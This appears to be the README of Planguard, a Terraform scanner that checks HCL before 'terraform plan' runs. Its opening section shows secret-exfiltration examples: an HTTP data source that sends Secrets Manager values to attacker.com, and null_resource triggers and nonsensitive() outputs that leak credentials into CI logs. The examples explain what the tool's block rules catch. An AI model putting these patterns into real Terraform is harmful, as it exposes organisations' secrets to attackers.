# Planguard 🛡️

Pre-plan Terraform security scanner with HCL-based configuration. Catch security issues and compliance violations before `terraform plan` runs.

## Features

- ✅ **Pre-plan scanning** - Catches issues before Terraform planning
- ✅ **Pure HCL configuration** - No code needed, just HCL rules
- ✅ **All Terraform functions** - Full support for Terraform expression syntax
- ✅ **Exception management** - Path-based, time-bound, auditable exceptions
- ✅ **GitHub Action ready** - Drop-in CI/CD integration
- ✅ **Fast** - Scans large codebases quickly
- ✅ **Extensible** - Add custom rules without code changes
- ✅ **Multiple output formats** - Text, JSON, SARIF

## 🚨 Why Scan Before Plan? Preventing Secret Exfiltration

**Critical Security Issue**: Terraform's `plan` stage can exfiltrate secrets. Anyone with permission to create a PR can potentially steal sensitive data before code review.

### The Attack: Exfiltrating Secrets During Plan

When someone opens a PR, CI runs `terraform plan`. But data sources **execute during plan** - before you review the code. An attacker can read secrets and send them out:

```hcl
# Step 1: Fetch secrets from AWS Secrets Manager (runs during plan)
data "aws_secretsmanager_secret_version" "db_creds" {
  secret_id = "production/database/master"
}

# Step 2: Exfiltrate via HTTP data source (runs during plan)
data "http" "exfil" {
  url = "https://attacker.com/steal?creds=${data.aws_secretsmanager_secret_version.db_creds.secret_string}"
}
```

Or use a more subtle approach with `null_resource` triggers that appear in plan output:

```hcl
# Attacker's "innocent looking" debug code
data "aws_secretsmanager_secret_version" "api_key" {
  secret_id = "prod/api/key"
}

resource "null_resource" "debug" {
  triggers = {
    # This appears in plan output and CI logs
    api_key = data.aws_secretsmanager_secret_version.api_key.secret_string
  }
}
```

When this runs, the plan output shows:
```
# null_resource.debug will be created
+ resource "null_resource" "debug" {
    + triggers = {
        + api_key = "sk_live_51Hj8..." # SECRET EXPOSED IN LOGS!
      }
  }
```

### Even More Subtle: nonsensitive() in Outputs

The `nonsensitive()` function strips the sensitive marker, exposing secrets in plan output that gets logged everywhere:

```hcl
# Fetch production database credentials
data "aws_secretsmanager_secret_version" "db" {
  secret_id = "prod/db/master"
}

# "Debug" output that leaks secrets
output "debug_connection" {
  value = nonsensitive(jsondecode(data.aws_secretsmanager_secret_version.db.secret_string))
}
```

Plan output exposes the secret:
```
Changes to Outputs:
  + debug_connection = {
      + password = "SuperSecret123!"
      + username = "admin"
    }
```

**This secret is now in:**
- CI logs (GitHub Actions, Jenkins, etc.)
- S3 plan files
- CloudWatch Logs
- Any log aggregation system
- Visible to anyone with CI access

### Attack Timeline

1. **Attacker opens PR** with malicious Terraform code
2. **CI runs `terraform plan`** automatically
3. **Data sources execute** during plan (before code review)
4. **Secrets are fetched** from Secrets Manager
5. **Secrets exfiltrated** via HTTP/DNS/logs
6. **No resources created** - plan shows "no changes", looks safe
7. **Attacker has secrets** - extracted from CI logs

### The Solution: Pre-Plan Scanning

Run Planguard **before** `terraform plan`:

```yaml
# In CI: Scan BEFORE plan
- name: Planguard Security Scan
  uses: jonathanhle/planguard@v1
  with:
    directory: terraform/
    fail-on: error

# Only run plan if scan passes
- name: Terraform Plan
  run: terraform plan
```

**Planguard's default rules block**:
- ✅ `data "http"` - Can exfiltrate via URL params
- ✅ `data "external"` - Can execute arbitrary commands
- ✅ `data "dns"` - Can leak via DNS queries
- ✅ `nonsensitive()` - Exposes secrets in plan output/logs

### Impact

**Without Planguard:**
- Anyone with PR access can steal secrets
- Secrets exposed in CI logs and artifacts
- No protection against insider threats

**With Planguard:**
- ✅ Blocks exfiltration before plan runs
- ✅ Detects malicious patterns in PRs
- ✅ Prevents secrets from appearing in logs
- ✅ Audit trail for security exceptions

**Best Practice**: Run Planguard in CI on every PR, before `terraform plan`, to ensure Terraform code is safe to execute.

## Quick Start

### As GitHub Action

```yaml
name: Terraform Security Scan
on: [pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Planguard
        uses: jonathanhle/planguard@v1
        with:
          directory: terraform/
          fail-on: error
```

### Local Installation

```bash
# Install from source
go install github.com/jonathanhle/planguard/cmd/planguard@latest

# Or download binary from releases
curl -L https://github.com/jonathanhle/planguard/releases/latest/download/planguard-linux-amd64 -o planguard
chmod +x planguard
sudo mv planguard /usr/local/bin/
```

### Run a Scan

```bash
planguard -config .planguard/config.hcl -directory ./terraform
```

## Configuration

### Basic Configuration

Create `.planguard/config.hcl`:

```hcl
settings {
  fail_on_warning = false
  exclude_paths = ["**/.terraform/**"]
}

# Use default rules (shipped with Planguard)
# Default rules cover AWS and common security patterns

# Add custom rules
rule "no_public_s3" {
  name     = "Prevent public S3 buckets"
  severity = "error"
  
  resource_type = "aws_s3_bucket"
  
  condition {
    expression = "self.acl == 'public-read'"
  }
  
  message = "S3 buckets must not be publicly accessible"
}

# Add exceptions
exception {
  rules = ["no_public_s3"]
  paths = ["modules/public-website/**/*.tf"]
  reason = "Public website buckets are intentionally public"
  approved_by = "security-team@example.com"
}
```

## Writing Rules

### Simple Rule

```hcl
rule "rds_encryption" {
  name     = "RDS must be encrypted"
  severity = "error"
  
  resource_type = "aws_db_instance"
  
  condition {
    expression = "!has(self, 'storage_encrypted') || self.storage_encrypted != true"
  }
  
  message = "RDS instances must have encryption enabled"
}
```

### Conditional Rule

```hcl
rule "prod_backup" {
  name     = "Production databases need backups"
  severity = "error"
  
  resource_type = "aws_db_instance"
  
  # Only apply in production
  when {
    expression = "lookup(self.tags, 'Environment', '') == 'prod'"
  }
  
  condition {
    expression = "!has(self, 'backup_retention_period') || self.backup_retention_period < 7"
  }
  
  message = "Production databases must have 7+ day backup retention"
}
```

### Cross-Resource Rule

```hcl
rule "vpc_flow_logs" {
  name     = "VPCs must have flow logs"
  severity = "error"
  
  resource_type = "aws_vpc"
  
  condition {
    expression = <<-EXPR
      length([
        for log in resources("aws_flow_log") :
        log if log.vpc_id == self.id
      ]) == 0
    EXPR
  }
  
  message = "All VPCs must have flow logs enabled"
}
```

### Complex Rule with JSON

```hcl
rule "no_wildcard_iam" {
  name     = "No wildcard IAM policies"
  severity = "error"

  resource_type = "aws_iam_policy"

  condition {
    expression = <<-EXPR
      anytrue([
        for stmt in jsondecode(self.policy).Statement :
        contains(try(tolist(stmt.Action), [stmt.Action]), "*") &&
        contains(try(tolist(stmt.Resource), [stmt.Resource]), "*")
      ])
    EXPR
  }

  message = "IAM policies cannot have both Action and Resource as wildcards"
}
```

## Writing Expressions

Planguard expressions support the full Terraform expression syntax. Choose the right syntax based on your expression complexity:

### Simple Expressions (Single-Line)

For basic comparisons and simple logic, use quoted strings:

```hcl
condition {
  expression = "self.enabled == true"
}

condition {
  expression = "!has(self, 'storage_encrypted') || self.storage_encrypted != true"
}
```

### Expressions with String Literals

When your expression contains string literals, you need to escape inner quotes with backslashes:

```hcl
condition {
  expression = "contains_function_call(\"nonsensitive\")"
}

condition {
  expression = "lookup(self.tags, \"Environment\", \"\") == \"prod\""
}
```

### Complex Expressions (Use Heredoc)

**Best Practice**: For multi-line expressions or expressions with many string literals, use **heredoc syntax** to eliminate escaping:

```hcl
condition {
  expression = <<-EXPR
    contains_function_call("nonsensitive") &&
    lookup(self.tags, "Environment", "") == "prod"
  EXPR
}
```

**Benefits of heredoc:**
- ✅ No need to escape quotes
- ✅ Multi-line support for readability
- ✅ Better for complex logic with loops and conditionals

### When to Use Each Syntax

| Syntax | Best For | Example |
|--------|----------|---------|
| **Quoted string** | Simple comparisons, no strings | `"self.enabled == true"` |
| **Quoted with escaping** | Single-line with few strings | `"lookup(self.tags, \"Env\", \"\") == \"prod\""` |
| **Heredoc** | Multi-line, complex logic, many strings | `<<-EXPR ... EXPR` |

### Heredoc Examples

**Cross-resource validation:**
```hcl
condition {
  expression = <<-EXPR
    length([
      for log in resources("aws_flow_log") :
      log if log.vpc_id == self.id
    ]) == 0
  EXPR
}
```

**JSON policy analysis:**
```hcl
condition {
  expression = <<-EXPR
    anytrue([
      for stmt in jsondecode(self.policy).Statement :
      contains(try(tolist(stmt.Action), [stmt.Action]), "*")
    ])
  EXPR
}
```

**Multiple conditions:**
```hcl
condition {
  expression = <<-EXPR
    has(self, "tags") &&
    has(self.tags, "Environment") &&
    contains(["dev", "staging", "prod"], self.tags.Environment)
  EXPR
}
```

## Available Functions

Planguard supports **all** Terraform functions plus domain-specific extensions:

### Standard Functions (from Terraform)

**String:** upper, lower, trim, split, join, replace, format, regex  
**Collection:** length, concat, contains, distinct, keys, values, merge  
**Type:** tostring, tonumber, tobool, tolist, tomap  
**Encoding:** base64encode, base64decode, jsondecode, jsonencode, urlencode  
**Crypto:** md5, sha256, sha512, bcrypt, uuid  
**Network:** cidrhost, cidrnetmask, cidrsubnet

### Domain-Specific Functions

```hcl
# Get resources by type (supports wildcards)
resources("aws_s3_bucket")
resources("aws_*")

# Get resources in same file
resources_in_file(self.file)

# Current context
day_of_week()      # "monday", "tuesday", etc.
git_branch()       # Current git branch

# Utilities
glob_match(pattern, string)
regex_match(pattern, string)
```

## Exception Management

### Path-Based Exceptions

```hcl
exception {
  rules = ["require_tags"]
  paths = [
    "environments/dev/**",
    "modules/legacy/**"
  ]
  reason = "Dev environment exempt from tagging"
  approved_by = "devops-team"
}
```

### Time-Bound Exceptions

```hcl
exception {
  rules = ["rds_encryption"]
  paths = ["legacy-db.tf"]
  reason = "Legacy database being migrated"
  approved_by = "security-team"
  expires_at = "2025-12-31"  # Auto-expires
  ticket = "JIRA-1234"
}
```

### Resource Name Exceptions

```hcl
exception {
  rules = ["no_public_s3"]
  resource_names = [
    "public_*",
    "*_cdn_bucket"
  ]
  reason = "CDN buckets must be public"
  approved_by = "security-team"
}
```

## Default Rules

Planguard ships with 20+ security rules covering:

### AWS
- **S3:** Public bucket prevention, versioning, encryption
- **IAM:** Wildcard policy detection, overly permissive policies
- **RDS:** Encryption, public access, backup retention
- **EC2:** IMDSv2, security group rules

### Common
- **Tagging:** Required tags, valid tag values
- **Naming:** Resource naming conventions

View all default rules in the `rules/` directory.

## Output Formats

### Text (Default)

```bash
planguard -format text
```

```
🔒 Planguard Scan Results
==================================================

❌ ERRORS: 3
--------------------------------------------------

terraform/main.tf:5:3
  Rule: Prevent public S3 buckets (aws_s3_public_read)
  Resource: aws_s3_bucket.public_bucket
  Message: S3 buckets must not be publicly accessible
```

### JSON

```bash
planguard -format json
```

```json
[
  {
    "RuleID": "aws_s3_public_read",
    "RuleName": "Prevent public S3 buckets",
    "Severity": "error",
    "Message": "S3 buckets must not be publicly accessible",
    "File": "terraform/main.tf",
    "Line": 5
  }
]
```

### SARIF (GitHub Security Tab)

```bash
planguard -format sarif > results.sarif
```

Integrates with GitHub's security tab for code scanning alerts.

## CLI Options

```bash
planguard [options]

Options:
  -config string
        Path to config file (default ".planguard/config.hcl")
  -directory string
        Directory to scan (default ".")
  -fail-on string
        Fail on severity level (error, warning, info) (default "error")
  -format string
        Output format (text, json, sarif) (default "text")
  -rules-dir string
        Directory containing default rules
  -version
        Show version
```

## CI/CD Integration

### GitHub Actions

```yaml
- name: Planguard
  uses: jonathanhle/planguard@v1
  with:
    config: .planguard/config.hcl
    fail-on: error
    format: sarif

- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v2
  with:
    sarif_file: planguard-results.sarif
```

### GitLab CI

```yaml
terraform-scan:
  image: jonathanhle/planguard:latest
  script:
    - planguard -config .planguard/config.hcl
```

### Pre-commit Hook

```bash
# .git/hooks/pre-commit
#!/bin/bash
planguard -config .planguard/config.hcl -directory . || exit 1
```

## Development

### Build from Source

```bash
git clone https://github.com/jonathanhle/planguard.git
cd planguard
make build
```

### Run Tests

```bash
make test
```

### Run on Examples

```bash
make run-example
```

## Architecture

```
┌─────────────────────────────────────┐
│   Planguard CLI                      │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│   Parser (HCL/Terraform)             │
│   • Parses .tf files into AST       │
│   • Extracts resources              │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│   Scanner Engine                     │
│   • Loads rules from HCL            │
│   • Evaluates expressions           │
│   • Applies exceptions              │
└─────────────┬───────────────────────┘
              │
              ▼
┌─────────────────────────────────────┐
│   Reporter                           │
│   • Formats violations              │
│   • Outputs text/JSON/SARIF         │
└─────────────────────────────────────┘
```

## FAQ

**Q: How is this different from tfsec/Checkov?**
A: Planguard uses pure HCL for rules (no need to learn new languages), has built-in exception management with expiration dates, and provides all Terraform functions out of the box.

**Q: Can I use this alongside tfsec/Checkov?**
A: Yes! Planguard is complementary. Use it for organization-specific rules with proper exception handling.

**Q: Do I need to run terraform init first?**
A: No! Planguard parses HCL directly without needing providers or state.

**Q: Can I write plugins in Go?**  
A: Currently rules are HCL-only. This covers 99% of use cases. Complex logic can be expressed with Terraform functions.

**Q: How do I test my rules?**
A: Write test .tf files that should trigger violations, then run Planguard to verify.

## Contributing

Contributions welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Submit a pull request

## For Maintainers

### Releasing a New Version

Planguard uses a `VERSION` file to control releases. To create a new release:

1. **Update the VERSION file:**
   ```bash
   echo "0.2.0" > VERSION
   git add VERSION
   git commit -m "Release v0.2.0"
   git push
   ```

2. **The release workflow automatically:**
   - Creates and pushes a git tag (e.g., `v0.2.0`)
   - Runs tests
   - Builds binaries for all platforms
   - Creates Docker images
   - Publishes to GitHub Container Registry (`ghcr.io`)
   - Updates Homebrew tap
   - Creates GitHub Release with binaries

3. **Update the major version tag (for GitHub Action users):**
   ```bash
   git tag -fa v0 -m "Update v0 to track v0.2.0"
   git push origin v0 --force
   ```

### Required Secrets

For releases to work properly, ensure the following GitHub Actions secrets are configured:

- **`HOMEBREW_TAP_TOKEN`**: Personal Access Token with `repo` scope
  - Create at: https://github.com/settings/tokens/new
  - Required for: Updating the `jonathanhle/homebrew-tap` repository
  - Scope needed: `repo` (full control of private repositories)
  - Add to: Repository Settings → Secrets → Actions → New repository secret

Without this token, releases will fail when trying to update the Homebrew formula.

## License

MIT License - see LICENSE file

## Support

- 📖 Documentation: https://github.com/jonathanhle/planguard
- 🐛 Issues: https://github.com/jonathanhle/planguard/issues
- 💬 Discussions: https://github.com/jonathanhle/planguard/discussions

## Acknowledgments

Built with:
- [HCL](https://github.com/hashicorp/hcl) - HashiCorp Configuration Language
- [go-cty](https://github.com/zclconf/go-cty) - Type system and functions

---

**Made with ❤️ for the Terraform community**
